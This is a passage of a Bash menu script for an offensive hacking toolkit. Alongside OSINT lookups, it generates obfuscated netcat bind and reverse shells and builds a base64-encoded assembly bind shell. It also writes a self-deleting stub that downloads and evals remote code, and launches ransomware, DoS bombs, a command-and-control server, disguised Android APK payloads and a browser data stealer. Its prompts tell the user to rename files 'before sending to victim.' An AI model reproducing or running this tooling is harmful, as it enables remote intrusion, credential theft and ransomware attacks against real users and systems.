            ((oct >= 0 && oct <= 255)) || return 1
        done
        return 0
    }

    find_your_ip() {
        local default_port ans ip_ext tmp ip_list i choice port
        default_port=${1:-4444}
        A=${A:-"Choose IP ==>"}
        if [[ -n "${GETIP_NONINTERACTIVE:-}" ]]; then
            local ni=${GETIP_NONINTERACTIVE}
            if [[ "$ni" == *:* ]]; then
                chosen_ip="${ni%%:*}"
                chosen_port="${ni##*:}"
            else
                chosen_ip="$ni"
                chosen_port="$default_port"
            fi
            if ! valid_ipv4 "$chosen_ip"; then
                echo -e "${R}GETIP_NONINTERACTIVE invalid IPv4: $chosen_ip${X}"
                return 1
            fi
            if ! [[ "$chosen_port" =~ ^[0-9]+$ ]] || ((chosen_port < 1 || chosen_port > 65535)); then
                echo -e "${R}GETIP_NONINTERACTIVE invalid port: $chosen_port${X}"
                return 1
            fi
            export chosen_ip chosen_port
            return 0
        fi
        ip_ext="$(dig -4 @resolver1.opendns.com ANY myip.opendns.com +short 2>/dev/null || true)"
        [[ -z "$ip_ext" ]] && ip_ext="$(curl -4fsS https://diagnostic.opendns.com/myip 2>/dev/null || true)"
        [[ -z "$ip_ext" ]] && ip_ext="$(curl -4fsS https://ifconfig.co 2>/dev/null || true)"
        mapfile -t ip_list < <(ip -4 addr show scope global 2>/dev/null | awk '/inet /{print $2}' | cut -d/ -f1 || true)
        echo -e "${g}\nAvailable IP addresses:${X}"
        i=1
        declare -a _opts
        if [[ -n "$ip_ext" ]]; then
            printf "  %2d) External: %s\n" "$i" "$ip_ext"
            _opts[i]="$ip_ext"
            ((i++))
        fi
        for tmp in "${ip_list[@]}"; do
            printf "  %2d) Local:    %s\n" "$i" "$tmp"
            _opts[i]="$tmp"
            ((i++))
        done
        printf "  %2d) Other (enter manually)\n\n" "$i"
        _opts[i]="OTHER"
        while true; do
            read -r -p "${g} Select option number: ${AA} ${X} " choice
            if ! [[ "$choice" =~ ^[0-9]+$ ]]; then
                echo -e "${R}Invalid number. Try again.${X}" && continue
            fi
            if ((choice >= 1 && choice < i)); then
                chosen_ip="${_opts[$choice]}"
            elif ((choice == i)); then
                read -r -p "${P} Enter IP manually: ${AA} ${X} " chosen_ip
            else
                echo -e "${R}Choice out of range. Try again.${X}" && continue
            fi

            if valid_ipv4 "$chosen_ip"; then
                break
            else
                echo -e "${R}Invalid IPv4 format. Try again.${X}"
            fi
        done
        while true; do
            read -r -p "Enter port (1-65535) [${default_port}]: CSTK ==>  " port
            port="${port:-$default_port}"
            if [[ "$port" =~ ^[0-9]+$ ]] && ((port >= 1 && port <= 65535)); then
                chosen_port="$port"
                break
            fi
            echo -e "${R}Invalid port. Try again.${X}"
        done
        while true; do
            echo -e "\n${g}You selected: ${G}${chosen_ip}:${chosen_port}${X}\n"
            read -r -p "${Y} Is this correct? (Y/N): ${AA} ${X} " ans
            case "$ans" in
            [Yy]*) break ;;
            [Nn]*)
                echo -e "${Y}Restarting selection...${X}"
                getip "$default_port"
                return
                ;;
            *) echo -e "${R} Please answer with a Y or N.${X}" ;;
            esac
        done
        export chosen_ip chosen_port
        return 0
    }
    if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
        find_your_ip "${1:-}"
        echo -e "\nChosen IP: ${G}${chosen_ip}${X}  Port: ${G}${chosen_port}${X}"
    fi
}

# ##### OSINT FUNCTIONS #####
# Class:OSINT - Tool:IP Lookup - Option 1 (Automated Script Run)
# Scripts needing a ip address and or port number will call this function for help
find_that_ip() {
    engagement_dispatch_guard find_that_ip || { wait_and_return; return 1; }
    local data data2 status ports vuln city regionName country zip lat lon isp ip_results
    clear
    osint_findip_frame
    sleep 5
    echo -e "${G} \nProvide an IP address to look up:\n ${X}"
    read -r -p "CSTK ==>  " IP
    data=$(curl -s "http://ip-api.com/json/$IP")
    data2=$(curl -s "https://internetdb.shodan.io/$IP")
    status=$(echo "$data" | jq -r '.status')
    ports=$(echo "$data2" | jq -r '.ports' | tr -d '[]' | tr -d "[:space:]")
    vuln=$(echo "$data2" | jq -r '.vulns' | tr -d '[]' | tr -d "[:space:]")
    if [[ $status == "success" ]]; then
        clear
        city=$(echo "$data" | jq -r '.city')
        regionName=$(echo "$data" | jq -r '.regionName')
        country=$(echo "$data" | jq -r '.country')
        zip=$(echo "$data" | jq -r '.zip')
        lat=$(echo "$data" | jq -r '.lat')
        lon=$(echo "$data" | jq -r '.lon')
        isp=$(echo "$data" | jq -r '.isp')
        echo -e "\n\nUser: \t $user \nDate: \t $DATE \nSearched IP: \t $IP \n--------------------------------------------------------- \nCity: \t $city \nState: \t $regionName \nCountry: \t $country \nZip: \t $zip \nLatitude: \t $lat \nLongitude: \t $lon \nInternet Service Provider: \t  $isp \nOpen Ports: \t $ports \nPossible Vulnerabilities: \t $vuln" | tee -a "$Loot/IP-Lookup.txt"
        echo -e "${G}\nInformation saved in $Loot/IP-Lookup.txt ${X}"
        ip_results=1
    else
        echo -e "${R} Failed to retrieve information. ${X}"
        echo -e "\n\nUser: \t $user \nDate: \t $DATE \nSearched IP: \t $IP \nResults: \t Failed to retrieve information." >>"$Loot/IP-Lookup.txt"
        ip_results=0
    fi
    if runtime_logging_enabled; then
        echo -e "User:\t$user\nDate:\t$DATE\nip address:\t$IP" >> "$log/IP-Lookup.log"
        if [[ "$ip_results" == 1 ]]; then
            echo -e "Results from scan:\tFound" >> "$log/IP-Lookup.log"
        else
            echo -e "Results from scan:\tNOT FOUND" >> "$log/IP-Lookup.log"
        fi
        echo -e "---\n\n" >> "$log/IP-Lookup.log"
    fi
    wait_and_return
}

# Class:OSINT - Tool:Ping Sweeper - Option 2 (Wrapper used)
sweep_ip() {
    engagement_dispatch_guard sweep_ip || { wait_and_return; return 1; }
	local file
	file="$bin/Osint_sweeper"
    clear
    osint_ipsweep_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    if runtime_logging_enabled; then
        printf "User Name:\t$USER\nDate and Time:\t$DATE\nScript Ran:\tPing-Sweeper\n\n" >>"$log/ping_sweeper.log"
    fi
    wait_and_return
}

# Class:OSINT - Tool:Nmap helper script - Option 3  (Wrapper used)
nmap_tool() {
    engagement_dispatch_guard nmap_tool || { wait_and_return; return 1; }
	local file
	file="$bin/Osint_IP_Sweeper_Wizard"
    clear
    osint_nmap_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    clear
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class:OSINT - Tool:Automated Enumeration Script - Option 4 (Wrapper used)
enum_tool() {
    engagement_dispatch_guard enum_tool || { wait_and_return; return 1; }
	local enum_bin
	enum_bin="$bin/Osint_enum"
    clear
    osint_enum_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    echo -e "\nEnter Website URL: \nExample hackersunit.com \n"
    read -r -p "CSTK ==>  " dom
    "$cstk_wrapper" "$enum_bin" "$dom" -a
    if runtime_logging_enabled; then
        echo -e "User Name:\t$USER\nDate and Time:\t$DATE\nScript Ran:\tAutomated Enumeration Script\n\n" >>"$log/auto_enum_script.log"
    fi
    wait_and_return
}

# Class:OSINT - Tool:Email Parser - Option 5 (Wrapper used)
breach_parse_wrapper() {
    engagement_dispatch_guard breach_parse_wrapper || { wait_and_return; return 1; }
    local breach_parse_bin breach_parse_single_bin data
	breach_parse_bin="$bin/Osint_breach_parse"
	breach_parse_single_bin="$bin/Osint_breach_parse_single"
	data="$home_dir/data"
    clear
    if ! [ -d "$data" ]; then
        echo -e "${R}   [WARNING] Files are not available. ${X} \n"
        echo -e "${G}   [INFO] To download the needed files rerun the install.sh script. ${X} \n"
        echo -e "${g}   [IMPORTANT] You need a minimum of 45 Gb Free disk space or install.sh script will not install. ${X}"
        wait_and_return
    fi
    osint_breached_frame
    sleep 5
    echo -e "${G} \nAre you searching for: ${R} \n1 -${P} single breached email account ${R} \n2 -${P} full breached domain email accounts ${R} \n3 -${P} main menu ${X}"
    read -r -n 1 -p "CSTK ==>  " opt
    if [[ "$opt" == 1 ]]; then
        echo -e "${G} \nEnter the email address to search ${X}"
        read -r -p "CSTK ==>  " email
        export CSTK_MAIN_RUNNER=1
        "$cstk_wrapper" "$breach_parse_single_bin" "$email"
    elif [[ "$opt" == 2 ]]; then
        export CSTK_MAIN_RUNNER=1
        "$cstk_wrapper" "$breach_parse_bin"
    else
        main_menu
    fi
    wait_and_return
}

# Class:OSINT - Tool:Google Dorks - Option 6
google_dorks() {
    engagement_dispatch_guard google_dorks || { wait_and_return; return 1; }
    clear
    osint_googledorks_frame
    sleep 5
    local BASIC_FILE SPECIAL_FILE FULL_FILE ADVANCED_FILE FILE SELECTED_DORK
    BASIC_FILE="$lib/GD_Basic.txt"
    SPECIAL_FILE="$lib/GD_Special.txt"
    FULL_FILE="$lib/GD_Full_List.txt"
    ADVANCED_FILE="$lib/GD_Advanced.txt"
    while true; do
        CATEGORY=$(echo -e "\nBasic\nSpecial\nFull\nAdvanced\nBack" | fzf --prompt="Select dork category (Basic: dork patterns) (Special: start with special character) (Advanced: Advanced google dorks) (Full: Full List 7000+) (or Back to exit): ")
        case $CATEGORY in
        Basic)
            FILE=$BASIC_FILE
            ;;
        Special)
            FILE=$SPECIAL_FILE
            ;;
        Full)
            FILE=$FULL_FILE
            ;;
        Advanced)
            FILE=$ADVANCED_FILE
            ;;
        Back | "")
            echo -e "${R} \nExiting or no selection made. Exiting. ${X}"
            wait_and_return
            ;;
        *)
            echo -e "${R} \nInvalid selection. Please try again. ${X}"
            continue
            ;;
        esac
        if [[ ! -f $FILE ]]; then
            echo -e "${R} \nFile $FILE not found. Exiting. ${X}"
            exit 3
        fi
        echo -e "${P} \nSearching within ${X} $CATEGORY ${P} dorks... ${X}"
        SELECTED_DORK=$(fzf --prompt="Search $CATEGORY dorks (or press Esc to go back): " <"$FILE")
        if [[ -z $SELECTED_DORK ]]; then
            echo -e "${R} \nNo dork selected, returning to category selection... ${X}"
            continue
        fi
        echo -e "${G} \nSelected dork: ${X} $SELECTED_DORK"
        break
    done
    wait_and_return
}

# Class:OSINT - Tool: holehe email finder - Program 7
email_search() {
    engagement_dispatch_guard email_search || { wait_and_return; return 1; }
    clear
    osint_socialemail_frame
    sleep 5
    echo -e "${G} \nEnter email address to search the web for. \n ${X}"
    read -r -p "Social Media Email Search -> " email
    echo -e "${O} \nWould you like in CSV format? Y/N \n ${X}"
    read -r -p "Social Media Email Search -> " cho
    if [[ "$cho" =~ [Yy] ]]; then
        holehe --only-used --csv "$email" | grep '[+]'
    elif [[ "$cho" =~ [Nn] ]]; then
        holehe --only-used "$email" | grep '[+]'
    else
        echo -e "${R} \nBad option ${X}"
        error_font
    fi
    wait_and_return
}

# Class:OSINT - Tool: password attack - Program 8 (Wrapper Used)
pass_attack() {
    engagement_dispatch_guard pass_attack || { wait_and_return; return 1; }
	local file
	file="$bin/Osint_password_attack"
    clear
    osint_passattack_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class:OSINT - Tool: Automated Vulnerability Search tool - Program 9 (Wrapper Used)
vuln_searcher() {
    engagement_dispatch_guard vuln_searcher || { wait_and_return; return 1; }
	local file
	file="$bin/Osint_auto_vuln_finder"
    clear
    osint_vulnfind_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class:OSINT - Tool: Username Generator - Program A
username_gen() {
    engagement_dispatch_guard username_gen || { wait_and_return; return 1; }
    local name1 name2 name3 role1 role2 role3
    clear
    osint_username_gen_frame
    sleep 5
    echo -e "Enter up to 3 username(s) to test \n\tExample: jon john johnny separated by a space without quotes"
    read -r name1 name2 name3
    echo -e "Enter up to 3 additions to adjust into username \n\tExample: lastname admin III separated by a space without quotes"
    read -r role1 role2 role3
    cat <<EOF > usernames.py
#!/usr/bin/env python3

from itertools import product

def variants(word):
    return [word, word.capitalize(), word.upper()]

names = ['$name1', '$name2', '$name3']
roles = ['$role1', '$role2', '$role3']
separators = ['', '_', '-']

with open('usernames.txt', 'w') as f:
    for n, r, sep in product(names, roles, separators):
        for nv, rv in product(variants(n), variants(r)):
            f.write(f"{nv}{sep}{rv}\n")
EOF
    python3 usernames.py
    if [[ -f usernames.txt ]]; then
        grep -E '[[:alnum:]]' usernames.txt > usernames.temp
        mv usernames.temp "$Loot/usernames.txt"
        [[ -f usernames.py ]] && { rm usernames.py 2>/dev/null ; } ;
        [[ -f usernames.txt ]] && { rm usernames.txt 2>/dev/null ; } ;
        echo "The file 'usernames.txt' is located in the Loot directory"
        wait_and_return
    else
        echo "Error in File ?"
        wait_and_return
    fi
}

# Class:OSINT - Tool: SSH Enumeration - Program B (Wrapper Used)
ssh_enum() {
    engagement_dispatch_guard ssh_enum || { wait_and_return; return 1; }
	local file
	file="$bin/Osint_ssh_enum_remote_host"
    clear
    osint_ssh_enum_frame
    sleep 5
    echo -e "${G}Enter the username.${B} \nExample jon, matt, tom. ${X}"
    read -r name
    echo -e "${g}Enter the ip address of ${R} $name. ${X} "
    read -r address
    echo -e "${P} $name@$address \n${G} Correct Y/n"
    read -r ans
    if [[ "$ans" =~ [Nn] ]]; then
        ssh_enum
    else
        export CSTK_MAIN_RUNNER=1
        "$cstk_wrapper" "$file" "$name@$address"
    fi
    wait_and_return
}

# Class:OSINT - Tool Waf Detect - Program C (Wrapper Used)
waf_detect() {
    engagement_dispatch_guard waf_detect || { wait_and_return; return 1; }
    local file
    file="$bin/Osint_http_waf_detect"
    clear
    osint_waf_detect_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# ##### PAYLOADS FUNCTIONS #####
# Class:PAYLOADS - Tool: Netcat Bind/Reverse Shells - Option 1
netcat_choice() {
    engagement_dispatch_guard netcat_choice || { wait_and_return; return 1; }
    clear
    payloads_nc_frame
    sleep 5
    echo -e "${P} \nDo you want to create a:${R} \n1${g} - binding netcat shell script${R} \n2${g} - reverse netcat shell script ${R} \n3${g} - binding netcat script in assembly language ${R} \n4 - Exit ${B} \nEnter option 1, 2, 3, or 4 to exit ${X} \n"
    read -r -n 1 -p "CSTK ==>  " opt
    until [[ "$opt" =~ ^[1-4]$ ]]; do
        echo -e "${R} \nBad option pick 1,2, 3 or 4 \n ${X}"
        read -r -n 1 -p "CSTK ==>  " opt
    done
    if [[ "$opt" -eq 1 ]]; then
        netcat_shells_bind
    elif [[ "$opt" -eq 2 ]]; then
        netcat_shells_reverse
    elif [[ "$opt" -eq 3 ]]; then
        netcat_shells_assembly
    else
        wait_and_return
    fi
}

# Class: PAYLOADS - Tool: Netcat Bind Shell Payload - Option 1-A
netcat_shells_bind() {
    engagement_dispatch_guard netcat_shells_bind || { wait_and_return; return 1; }
    local file ncb template final_script
    file="$lib/NetcatBindShell"
    ncb="$lib/HCDOUNASIXNTM7Q3YR-X-encoded.enc"
    trap 'rm -f "$lib/NetcatBindShell" "$lib/NetcatBindShell.x.c"' SIGQUIT SIGILL SIGTERM SIGHUP EXIT 2>/dev/null
    clear
    payloads_nc_frame
    getip
    dec_file "$ncb" "$file" || return 1
    template=$(cat "$file")
    final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
    echo "$final_script" > "$file" # create full correct script
    shc -r -f "$file" -o "$Malware/NetcatBindingShellScript" # compile script
    rm -f "$file" "$file.x.c" 2>/dev/null  # remove junk files
    trap - SIGQUIT SIGILL SIGTERM SIGHUP EXIT
    echo -e "${g} File \"NetcatBindingShellScript\" is ready and executable in the $Malware folder. \n Change the name of file before sending to target. ${X}"
    if runtime_logging_enabled; then
        echo -e "User Name:\t$USER\nDate and Time\t$DATE\nUser Port:\t$chosen_port\nScript Ran:\tnetcat binding shell create" >>"$log/NetcatBindShell.log"
    fi
    show_tty_upgrade_hint
    wait_and_return
}

# Class: PAYLOADS - Tool: Netcat Reverse Shell - Option 1-B
netcat_shells_reverse() {
    engagement_dispatch_guard netcat_shells_reverse || { wait_and_return; return 1; }
    local file ncr template final_script
    file="$lib/NetcatReverseShell"
    ncr="$lib/QI2NTM7Q3YRVBGDBR-X-encoded.enc"
    trap 'rm -f "$lib/NetcatReverseShell" "$lib/NetcatReverseShell.x.c"' SIGQUIT SIGILL SIGTERM SIGHUP EXIT 2>/dev/null
    clear
    getip
    payloads_nc_frame
    dec_file "$ncr" "$file" || return 1
    template=$(cat "$file")
    final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
    echo "$final_script" > "$file" # create full correct script
    shc -r -f "$file" -o "$Malware"/NetcatReverseShellScript # compile script
    rm -f "$file" "$file.x.c" 2>/dev/null                      # remove junk files
    trap - SIGQUIT SIGILL SIGTERM SIGHUP EXIT
    echo -e "${g} File \"NetcatReverseShellScript\" is ready and executable in the $Malware folder. \nChange the name of file before sending to target. ${X}"
    if runtime_logging_enabled; then
        echo -e "User Name:\t$USER\nDate and Time:\t$DATE\nUser IP and Port used:\t$chosen_ip:$chosen_port\nTool Used:\tNetcat Reverse shell create\n\n" >>"$log/NetcatReverseShell.log"
    fi
    show_tty_upgrade_hint
    wait_and_return
}

# Class: PAYLOADS - Tool: Netcat Assembly Shell - Option 1-C
netcat_shells_assembly() {
    engagement_dispatch_guard netcat_shells_assembly || { wait_and_return; return 1; }
    trap 'rm -f "$Malware/execute.asm" "$Malware/execute.o"; secure_user_data_permissions >/dev/null 2>&1 || true' SIGQUIT SIGILL SIGTERM SIGHUP EXIT 2>/dev/null
    clear
    payloads_nc_frame
    sleep 5
    if ! command -v nasm >/dev/null; then
        echo "Program nasm not installed"
        wait_and_return
    fi
    if ! command -v ld >/dev/null; then
        echo "Program ld not installed"
        wait_and_return
    fi
    echo "U0VDVElPTiAuZGF0YQpjb21tYW5kICAgICAgICAgZGIgICAgICAnL2Jpbi9uY2F0JywgMGgKYXJnMSAgICAgICAgICAgIGRiICAgICAgJy1scCA0NDQ0JywgMGgKYXJnMiAgICAgICAgICAgIGRiICAgICAgJy1lJywgMGgKYXJnMyAgICAgICAgICAgIGRiICAgICAgJy9iaW4vYmFzaCcsIDBoCmFyZ3VtZW50cyAgICAgICBkZCAgICAgIGNvbW1hbmQKICAgICAgICAgICAgICAgIGRkICAgICAgYXJnMQogICAgICAgICAgICAgICAgZGQgICAgICBhcmcyCiAgICAgICAgICAgICAgICBkZCAgICAgIGFyZzMKZW52aXJvbm1lbnQgICAgIGRkICAgICAgMGgKClNFQ1RJT04gLnRleHQKZ2xvYmFsICBfc3RhcnQKCl9zdGFydDoKCiAgICBtb3YgICAgIGVkeCwgZW52aXJvbm1lbnQKICAgIG1vdiAgICAgZWN4LCBhcmd1bWVudHMKICAgIG1vdiAgICAgZWJ4LCBjb21tYW5kCiAgICBtb3YgICAgIGVheCwgMTEKICAgIGludCAgICAgODBoCg==" | base64 -d >"$Malware/execute.asm"
    nasm -f elf "$Malware/execute.asm"
    ld -m elf_i386 "$Malware/execute.o" -o "$Malware/execute"
    rm -f "$Malware/execute.asm" "$Malware/execute.o"
    trap - SIGQUIT SIGILL SIGTERM SIGHUP EXIT
    echo -e "File named 'execute' is in the $Malware folder\nYou can change the name if you wish\nRunning the program Example: ./execute"
    wait_and_return
}

# Class: PAYLOADS - Tools: Linux Back door Creator - Option 2
rev_shells() {
    engagement_dispatch_guard rev_shells || { wait_and_return; return 1; }
    local rvs file template final_script
    rvs="$lib/YXOKETATIH4WMF4KG-X-encoded.enc"
    file="$lib/LinuxReverseShell"
    trap 'rm -f "$lib/LinuxReverseShell" "$lib/LinuxReverseShell.x.c"' SIGQUIT SIGILL SIGTERM SIGHUP EXIT 2>/dev/null
    clear
    payloads_linuxshells_frame
    sleep 5
    getip
    dec_file "$rvs" "$file" || return 1
    template=$(cat "$file")
    final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
    echo "$final_script" > "$file"
    shc -r -f "$file" -o "$Malware"/RevShell
    rm -f "$file" "$file.x.c"
    trap - SIGQUIT SIGILL SIGTERM SIGHUP EXIT
    echo -e "${g} File \"RevShell\" is ready and executable in the $Malware folder. \n Change the name of file before sending to victim. ${X}"
    if runtime_logging_enabled; then
        echo -e "User Name:\t$USER\nDate and Time:\t$DATE\nIP and Port used:\t$chosen_ip:$chosen_port\nProgram Name:\tReverse shell generate" >>"$log/ReverseShells.log"
    fi
    show_tty_upgrade_hint
    wait_and_return
}

# Class: PAYLOADS - Tools: Ransomware - Option 3
ransomware_shell_options() {
    engagement_dispatch_guard ransomware_shell_options || { wait_and_return; return 1; }
    clear
    payloads_ransomware_frame
    sleep 5
    echo -e "${P} Choose option:${G} \n 1 - A Go program for Windows or Linux that encrypts the home directory and its subdirectories ${g} \n 2 - A script that encrypts the Linux file system under /root and /home/USER. ${X}"
    read -r -n 1 -p "${R} Enter number 1 or 2 CSTK ==>  " opt
    if [[ "$opt" = 1 ]]; then
        ransomware_in_go
    elif [[ "$opt" = 2 ]]; then
        ransomware_quick_dirty
    else
        echo -e "${R} Bad option ${X}"
        exit 2
    fi
}

# Class: PAYLOADS - Tools: Ransomware in Go - Option 3-A
ransomware_in_go() {
    engagement_dispatch_guard ransomware_in_go || { wait_and_return; return 1; }
    local file
    file="$bin/Payload_ransomware_golang"
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}
# Class: PAYLOADS - Tool: Ransomware encrypt/decrypt script - Option 3
ransomware_quick_dirty() {
    engagement_dispatch_guard ransomware_quick_dirty || { wait_and_return; return 1; }
    local file
    file="$home_dir/scripts/bin/Payload_ransomware"
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class:PAYLOADS - Tool:Multi reverse shell option script - Option 4 (wrapper used)
rev_shells_all() {
    engagement_dispatch_guard rev_shells_all || { wait_and_return; return 1; }
    local mss file DES_DIR start_files end_files new_files
    mss="$lib/KEpwd83JDNWO864ErrfdPl-X-encoded.enc"
    file="$bin/multi_shells_script.sh"
    trap 'rm -f "$bin/multi_shells_script.sh"' SIGQUIT SIGILL SIGTERM SIGHUP EXIT 2>/dev/null
    clear
    payloads_allshells_frame
    sleep 5
    start_files=$(ls "$PWD")
    DES_DIR="$Malware"
    export CSTK_MAIN_RUNNER=1
    dec_file "$mss" "$file" || return 1
    chmod +x "$file"
    "$cstk_wrapper" "$file"
    end_files=$(ls "$PWD")
    new_files=$(comm -13 <(echo "$start_files" | sort) <(echo "$end_files" | sort))
    for file in $new_files; do
        if [ -f "$file" ]; then
            mv "$file" "$DES_DIR"
        fi
    done
    rm -f "$bin/multi_shells_script.sh"
    trap - SIGQUIT SIGILL SIGTERM SIGHUP EXIT
    show_tty_upgrade_hint
    wait_and_return
}

# Class: PAYLOADS - Tool: no touch disk payload - Option 5
no_touch_script() {
    engagement_dispatch_guard no_touch_script || { wait_and_return; return 1; }
    local file HTTP HOST SCRIPT out_script template script
    file="$bin/NoTouchScript.sh"
    trap 'rm -f "$bin/NoTouchScript.sh" "$bin/NoTouchScript.sh.x.c"' SIGQUIT SIGILL SIGTERM SIGHUP EXIT 2>/dev/null
    clear
    payloads_notouch_frame
    sleep 5
    echo -e "${B} \nIs website http or https:?"
    read -r -p "CSTK ==>  " HTTP
    echo -e "${G} \nEnter the host address where the target will get the in memory script from Example: 192.168.1.1 or google.com \n ${X}"
    read -r -p "CSTK ==>  " HOST
    echo -e "${g} \nEnter the scripts path for target to grab and run in memory Example: payload-in-memory.sh \n ${X}"
    read -r -p "CSTK ==>  " SCRIPT
    echo -e "${B} \nEnter a final script name to output\n ${X}"
    read -r out_script
    echo 'IyEvYmluL2Jhc2gKClg9JChjdXJsIC1mc1NMICJfaHR0cDovL19ob3N0L19zY3JpcHQiKQpldmFsICIkWCIgMj4vZGV2L251bGwgJiBjbGVhcgpybSAtcmYgLS0gIiQwIgo=' | base64 -d > "$file"
    template=$(cat "$file")
    script=$(echo "$template" | awk -v HTTP="$HTTP" -v HOST="$HOST" -v SCRIPT="$SCRIPT" '{ gsub(/_http/, HTTP) ; gsub(/_host/, HOST) ; gsub(/_script/, SCRIPT) ; print }')
    echo "$script" > "$file"
    shc -r -f "$file" -o "$Malware/$out_script"
    rm -f "$file.x.c" "$file"
    trap - SIGQUIT SIGILL SIGTERM SIGHUP EXIT
    echo -e "\n\n ${P} File $out_script is available in the Malware folder ${X} \n"
    if runtime_logging_enabled; then
        echo -e "User:\t$USER\nDate:\t$DATE\nProgram used:\tin memory payload\nTarget URL and script:\t$HTTP://$HOST/$SCRIPT\n" >> "$log/no-touch-payload.log"
    fi
    wait_and_return
}

# Class: PAYLOADS - Tool: DoS Bomb Attack - Option 6 (Wrapper used)
dos_bomb_attack() {
    engagement_dispatch_guard dos_bomb_attack || { wait_and_return; return 1; }
    local file
	file="$bin/Payload_bomb_attacks"
    payloads_dosbomb_frame
    sleep 5
    echo -e "${R} \nThese attacks have 3 available methods, Bombs are placed in the Malware folder and instructions are printed to the screen. ${G} \nContinue? \(Y\)es \(N\)o \n ${X}"
    read -r -p "CSTK ==>  " bomb

    if [[ "$bomb" =~ ^[Nn]$ ]]; then
        wait_and_return
    elif [[ "$bomb" =~ ^[Yy]$ ]]; then
        export CSTK_MAIN_RUNNER=1
        "$cstk_wrapper" "$file"
    else
        dos_bomb_attack
    fi

    wait_and_return
}

# Class: PAYLOADS - Tool: SSH Attack - Option 7 (Wrapper used)
ssh_attack() {
    engagement_dispatch_guard ssh_attack || { wait_and_return; return 1; }
    local file
	file="$bin/Payload_make_ssh_keys"
    payloads_sshattack_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: PAYLOADS - Tool: Metasploit payload tools - Option 8 (Wrapper used)
msf_payloads() {
    engagement_dispatch_guard msf_payloads || { wait_and_return; return 1; }
    local msfvenom_bin msf_embed_binary
	msfvenom_bin="$bin/msf_payload_create"
	msf_embed_binary="$bin/msf_payload_inject"
    payloads_msf_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    echo -e "Do you want to \n 1) Create a new authorized-test payload using msfvenom \n 2) Inject a payload into a compatible Windows PE executable "
    read -r num
    case "$num" in
        1) "$cstk_wrapper" "$msfvenom_bin" ;;
        2) "$cstk_wrapper" "$msf_embed_binary" ;;
        *) exit ;;
    esac
    wait_and_return
}

# Class: PAYLOADS - Tool: APK Builder (msfvenom) - Option 9 (Wrapper used)
apk_killer() {
    engagement_dispatch_guard apk_killer || { wait_and_return; return 1; }
	local file
	file="$bin/Payload_apk_builder"
    clear
    payloads_apk_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    echo -e "\n  Choose connection type: \n1\) Meterpreter \n2\) Shell \n"
    read -r -n 1 -p "CSTK ==>  " con
    if [[ "$con" = 1 ]]; then
        type="meterpreter"
        elif [[ "$con" = 2 ]]; then
        type="shell"
    else
        echo "Bad Option"
        exit 2
    fi
    clear
    echo -e "\nChoose connection method:\n1\) tcp\n2\) http\n3\) https\n"
    read -r -n 1 -p "CSTK ==>  " met
    if [[ "$met" = 1 ]]; then
        payload="android/$type/reverse_tcp"
    elif [[ "$met" = 2 ]]; then
        payload="android/$type/reverse_http"
    elif [[ "$met" = 3 ]]; then
        payload="android/$type/reverse_https"
    else
        echo "Bad Option"
        error_font
    fi
    clear
    echo -e "\nEnter IP Address for malware script to connect back to:\n"
    read -r -p "CSTK ==>  " ipa
    clear
    echo -e "\nEnter port number to use: \(1-65535\)\n"
    read -r -p "CSTK ==>  " ipp
    clear
    echo -e "\nEnter finished apk app name to use\nExample: WhatsApp.apk\n"
    read -r -p "CSTK ==>  " fileO
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file" -p "$payload" LHOST="$ipa" LPORT="$ipp" -o "$fileO"
    wait_and_return
}
# Class: PAYLOADS - Tool: Command And Control Server - Option A (Wrapper used)
cnc_server() {
    engagement_dispatch_guard cnc_server || { wait_and_return; return 1; }
    file="$bin/Payload_CommandAndControl"
    clear
    payloads_cnc_server_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}
# ##### POST EXPLOIT TOOLS #####
# Class: POST EXPLOIT - Tools: Check if VM - Option 1
check_the_vm() {
    engagement_dispatch_guard check_the_vm || { wait_and_return; return 1; }
	local file
	file="$bin/PostEx_am_i_on_a_vm"
    clear
    postx_vm_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: POST EXPLOIT - Tool: Web Browser Info Stealer - Option 2 (Wrapper used)
browser_data_wrapper() {
    engagement_dispatch_guard browser_data_wrapper || { wait_and_return; return 1; }
	local file
	file="$bin/PostEx_browser_thief"
    clear
    postx_browserthief_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file" --all
    wait_and_return
}

# Class: POST EXPLOIT - Tool: Crypto Finder - Option 3 (Wrapper Used)
crypto_catch() {
    engagement_dispatch_guard crypto_catch || { wait_and_return; return 1; }
    local file
    file="$bin/Crypto_Catch"
    clear
    postx_crypto_frame
    sleep 5
    export CSTK_MAIN_RUNNER=1
    "$cstk_wrapper" "$file"
    wait_and_return
}

# Class: POST EXPLOIT - Tool: File Permissions Exploit - Option 4 (Wrapper Used)
check_gtfob() {
    engagement_dispatch_guard check_gtfob || { wait_and_return; return 1; }
	local file
	file="$bin/PostEx_GTFONow"
    clear
    postx_file_frame
    sleep 5
    echo "Do you know the sudo password? Y/n"
    read -r pass
    export CSTK_MAIN_RUNNER=1
